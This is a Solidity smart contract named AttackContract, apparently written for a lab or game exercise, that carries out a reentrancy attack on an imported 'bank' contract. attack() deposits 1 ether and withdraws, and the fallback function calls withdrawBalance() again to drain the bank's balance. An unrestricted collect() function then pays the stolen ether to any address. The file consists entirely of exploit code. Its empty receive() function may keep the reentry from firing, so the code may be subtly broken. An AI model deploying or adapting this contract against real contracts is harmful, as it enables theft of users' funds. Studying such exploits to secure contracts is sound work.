//SPDX-License-Identifier : MIT
pragma solidity ^0.8.0;

import "./GameToken.sol";

contract AttackContract {
    ExternalPlayer public bank;

    constructor(address _bankAddress) {
        bank = ExternalPlayer(_bankAddress);
    }
    receive() external payable{}
    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdrawBalance();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.sendEtherToContract{value: 1 ether}();
        bank.withdrawBalance();
    }

    function collect(uint256 _amount, address payable _address) public {
	    _address.transfer( _amount);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}